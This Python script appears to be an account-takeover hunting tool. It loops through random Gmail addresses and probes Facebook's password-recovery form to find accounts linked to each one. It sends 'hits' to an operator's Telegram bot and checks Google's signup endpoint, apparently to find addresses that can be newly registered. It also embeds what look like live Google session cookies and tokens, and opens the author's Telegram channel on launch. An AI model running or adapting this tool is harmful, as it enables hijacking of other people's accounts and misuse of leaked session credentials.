import requests,random
import mechanize,webbrowser
webbrowser.open('https://t.me/tehlikeliadam')
from user_agent import *
user='1234567890qwertyuiopasdfghjklzxcvbnm.'
num='6789'
token = input ('[✓] TOKEN : ')
ID = input ('[✓] ID : ')
while True:
	
	rng=int("".join(random.choice(num)for i in range(1)))
	name=str("".join(random.choice(user)for i in range(rng)))
	SIN = name +'@gmail.com'
	email2 = SIN.replace('@','&#064;')
	br = mechanize.Browser()
	br.set_handle_robots(False)
	url = 'https://mbasic.facebook.com/login/identify/?ctx=recover'
	br.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
	br.open(url)
	br.select_form(nr=0)
	br.set_all_readonly(False)
	br["email"] = SIN
	req = br.submit()
	rr = email2 in str(req.read())
	if rr == True:
		print(f'[\033[4;32m✓]Good Facebook : {SIN} ')
		tlg = (f'''
✓------NEW HIT-------✓
GOOG : {SIN}
•----------------------------•
TELE : @tehlikeliadam ''')
		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
		        	
	else:
		print(f'\033[4;31m[✓]Bad Facebook : {SIN} ')
		FG = f'''
		BAD : {SIN}
	👇👇
		'''
		email= SIN
		email=email.split('@')[0]+'@gmail.com'
		url = 'https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=475082&rt=j'
		head1={
		            'accept': '*/*',
		            'accept-encoding': 'gzip, deflate, br',
		            'accept-language': 'en-US,en;q=0.9',
		            'content-length': '1190',
		            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		            'cookie': 'SEARCH_SAMESITE=CgQI25YB; HSID=AqVNcLgtyV8qACjl5; SSID=AiNW8hZgJ42pJTUj2; APISID=QWpcaMriU0QKLpYp/AjC54ZWtOzRENNgX8; SAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-1PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-3PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; ACCOUNT_CHOOSER=AFx_qI7F0xHvZRK8KJSe6tz0NrURnzUEwvN4MMYPRIaZwiFyANVBF9uXlDYL9kF-1j0wyelu_fqr153ri1ORaLKdhjv9B1zqV7Nttlu5qLcSiavoIiKPs5nvt0qNp53Dp9hekTjqZYaGdtk77UEMCPU6VvKzK2n5gtttlAA9IOUPjJgDQtAva4IgwfZzC6Qjng-FhLmXvSwi2aSXMMr_HGpvUGryFOfY2dhl-w3_AwnjgNIs0xJyB3GAXLCGNG1p7xjlrlJ3j35czk-j8AZgbsSWDDYsa8m-pw; SID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7H7toj2PuG1CT7RYZ656tzA.; __Secure-1PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7ZskS6AGBqxv4R7sFByoTgw.; __Secure-3PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7bylvFXShcOWp8xEMoyRYAQ.; LSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqvnwzyEOsjtpz_Xv3YGSMkw.; __Host-1PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqVJM2Mjba_0rnj_DpK7-GcQ.; __Host-3PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqUMoH-tlvVsLba3TIeM8xLg.; 1P_JAR=2022-11-28-17; AEC=AakniGOQHd2YtABZyBR9LGAvOJLjp0xkZ0OPqzrGu6LFT9KbKQTFodmOHg; __Host-GAPS=1:aBoUpYnr12jBFZ_iZDrKVMeNlWM4mjudwFahtCfp5keaEDllyjeCv7YgFni40L0SP85ivw99bMXSROFGUyBFjTB0R1wbFg:8Q3DBwhkEFgTBkRb; NID=511=i7bHDBHZU1IVY6Tux4JU0SZx6J9Pl9grdAYnPr_orMAmES5xzdwRm4EGhIFG8fQ3NiIYMRZW3wUzfa71g2LKw9rjov4HgZtW_PhYxdPQVOK1NZIIdRRGvV1gcyDL81lpEPM7UdDBPSf85v0Z3nIG7aU7iqBag1oR90lU5rLjvXLfYe2rIiW6kLaAfeTv94xqGE8hJyDWGAeiRskQ1zjH4T5bHy6SWVHkcqF_ABaAGkFyb7qzr1_aPjyZd2plSxPtras2HvxCue22Quz1EKY2MKitEyt61VX_CPQMmpZCasXmHhO6w-p_UEYoeQNUX14IvzBu8HCAE_DzTkMpdwhhRq8Dp2Dxy6ZTmfhvIi12SxgIVkgFiYq1hKzAQEI; SIDCC=AIKkIs1N81QwhWri0Bzm-vrZd8ZdIcJEwQhxW5Nq6Fz0ZGYet75_HxakoP7e7FCuuwygEHCFBA; __Secure-1PSIDCC=AIKkIs1zz7mbkrfHGeL2Kc6ha56DRIcm394O1QHjGydZ6iK2E07-NUbA4qBrmwETMvxL9yu71w; __Secure-3PSIDCC=AIKkIs2nVxwPe7zp6d3FIM80oZYUYY-pWAGBtpDrCIFpORKRPEJkQenJ1ZEXQqvUst5tgIW-U70',
		            'google-accounts-xsrf': '1',
		            'origin': 'https://accounts.google.com',
		            'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fdeleteaccount&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
		            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
		            'sec-ch-ua-mobile': '?0',
		            'sec-ch-ua-platform': '"Windows"',
		            'sec-fetch-dest': 'empty',
		            'sec-fetch-mode': 'cors',
		            'sec-fetch-site': 'same-origin',
		            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
		            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=84bf7e62-6751-416e-bb03-1edc3d7c194a,signin_mode=all_accounts,signout_mode=show_confirmation',
		            'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiTocsBCMXhzAEIlenMAQjl68wBCO7tzAEI8/HMAQiM98wBCM35zAEI0PrMAQik+8wBCKn8zAEIwIqrAg==',
		
		            'x-same-domain': '1'
		        }
		data1 ={
		            'continue': 'https://myaccount.google.com/deleteaccount',
		            'service': 'accountsettings',
		            'f.req': f'["TL:ADFpJfN4RVRp-IIIn2iZfL88X6EJH_mnJCHatuWdaugBEMaMnfVIlVYDyuILuNJV","zaid","fdf","{email}",false,"S302716898:1669657854848764",1]',
		            'at': 'AFoagUW3jURSo46O8KfZ96FjJv613X4xRg:1669657854874',
		            'azt': 'AFoagUVcdDPp0WLYJ4W-HDpm0Y9Y_TkciQ:1669657854874',
		            'cookiesDisabled': 'false',
		            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"84bf7e62-6751-416e-bb03-1edc3d7c194a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
		            'gmscoreversion': 'undefined'
		
		        }
	try:
		        	res = requests.post(url,
		        	data=data1,headers=head1).text
	except:
		        		print('za') 
	if ('"gf.wuar",1') in res:
		        		print(f'''
\033[4;32m[✓]Good Email : {email}''')
		        		
		        		
	else:
		        		print(f'[\033[4;33m✓] BAD Email : {email}')


